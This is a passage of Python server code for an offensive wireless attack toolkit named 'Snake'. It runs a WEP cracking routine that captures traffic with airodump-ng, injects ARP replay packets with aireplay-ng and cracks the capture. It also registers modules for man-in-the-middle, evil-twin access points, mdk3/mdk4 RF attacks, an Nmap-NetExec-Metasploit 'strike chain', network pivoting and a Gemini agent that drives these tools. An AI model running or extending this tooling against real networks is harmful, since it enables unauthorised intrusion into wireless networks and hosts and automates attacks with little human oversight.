    cap_prefix = str(CAPTURES / f"wep_{bssid.replace(':','-')}")
    # Start capture
    cap_proc = subprocess.Popen(
        ["airodump-ng", "-c", str(channel), "--bssid", bssid, "-w", cap_prefix, iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        start_new_session=True,
    )
    time.sleep(5)
    # Inject
    inject_proc = subprocess.Popen(
        ["aireplay-ng", "--arpreplay", "-b", bssid, iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        start_new_session=True,
    )
    _job_processes[jid] = [cap_proc, inject_proc]
    _job_stop_events[jid].wait(30)
    inject_proc.terminate()
    cap_proc.terminate()

    caps = sorted(glob.glob(f"{CAPTURES}/wep_{bssid.replace(':','-')}*.cap"),
                  key=os.path.getmtime)
    return engine.crack_handshake_aircrack(caps[-1], bssid, essid) if caps else None


# ── WebSocket Events ─────────────────────────────────────────────────────────
@socketio.on("connect")
def ws_connect():
    snap = session.get_snapshot()
    snap["tools"]      = check_tools()
    snap["interfaces"] = [
        {"name": iface, "mode": get_interface_mode(iface)}
        for iface in get_interfaces()
    ]
    emit("init", snap)
    snake_log("[~] Client connected to Snake control panel", "INFO")


@socketio.on("ping_snake")
def ws_ping(data):
    emit("pong_snake", {"ts": time.time(), "state": session.state.value})


# ── Startup heartbeat ────────────────────────────────────────────────────────
def _heartbeat():
    while True:
        time.sleep(10)
        socketio.emit("heartbeat", {
            "ts":    time.time(),
            "state": session.state.value,
            "stats": session.stats,
            "networks_count": len(session.networks),
        })


# ── Entry point ──────────────────────────────────────────────────────────────
def _scanner_iface() -> str:
    if _scanner and getattr(_scanner, "_running", False):
        return getattr(_scanner, "iface", "") or ""
    return ""


def _register_job_runner(jid: str, runner):
    _job_runners[jid] = runner


def _register_job_stop(jid: str, event):
    _job_stop_events[jid] = event


def _teardown_wireless_for_pivot():
    _stop_active_scanner(reason="pivot")
    stop_all_twin()
    stop_all_rf()


def _cleanup_runtime():
    _stop_active_scanner(reason="shutdown")
    stop_all_twin()
    stop_all_rf()
    stop_all_mitm()
    stop_all_strike()
    stop_all_pivot()
    for event in _job_stop_events.values():
        event.set()
    for runner in list(_job_runners.values()):
        runner.kill()
    for processes in list(_job_processes.values()):
        for process in processes:
            if process.poll() is None:
                try:
                    os.killpg(process.pid, signal.SIGTERM)
                except (ProcessLookupError, PermissionError):
                    process.terminate()


atexit.register(_cleanup_runtime)


def run_server(host="127.0.0.1", port=5000, debug=False):
    os.environ.setdefault("SNAKE_AGENT_BASE", f"http://{host}:{port}")
    init_agent_bridge(app)
    job_hooks = {
        "register_runner": _register_job_runner,
        "register_stop": _register_job_stop,
        "scanner_iface": _scanner_iface,
        "stop_scan": _stop_active_scanner,
        "twin_ifaces": active_twin_ifaces,
    }
    mitm_register(socketio, log_cb=snake_log)
    rf_register(socketio, log_cb=snake_log, job_hooks=job_hooks)
    twin_register(socketio, log_cb=snake_log, job_hooks=job_hooks)
    strike_register(socketio, log_cb=snake_log)
    arsenal_register(socketio, log_cb=snake_log)
    pivot_register(socketio, log_cb=snake_log, teardown_cb=_teardown_wireless_for_pivot)
    t = threading.Thread(target=_heartbeat, daemon=True)
    t.start()
    snake_log("[🐍] Snake control panel starting...", "INFO")
    snake_log("[🎯] MITM module loaded — /api/mitm/* ready", "INFO")
    snake_log("[👻] Evil Twin module loaded — /api/twin/* ready", "INFO")
    snake_log("[RF] mdk3/mdk4 module loaded — /api/rf/* ready", "INFO")
    snake_log("[⚡] Strike chain loaded — /api/strike/* (Nmap → NetExec → MSF)", "INFO")
    snake_log("[🌉] Pivot bridge loaded — /api/pivot/* (opt-in join → Strike)", "INFO")
    snake_log("[📄] Report generator loaded — /api/report", "INFO")
    snake_log("[🤖] Gemini Agent loaded — /api/agent/* (set GEMINI_API_KEY)", "INFO")
    socketio.run(app, host=host, port=port, debug=debug, use_reloader=False,
                 allow_unsafe_werkzeug=True)


if __name__ == "__main__":
    run_server()
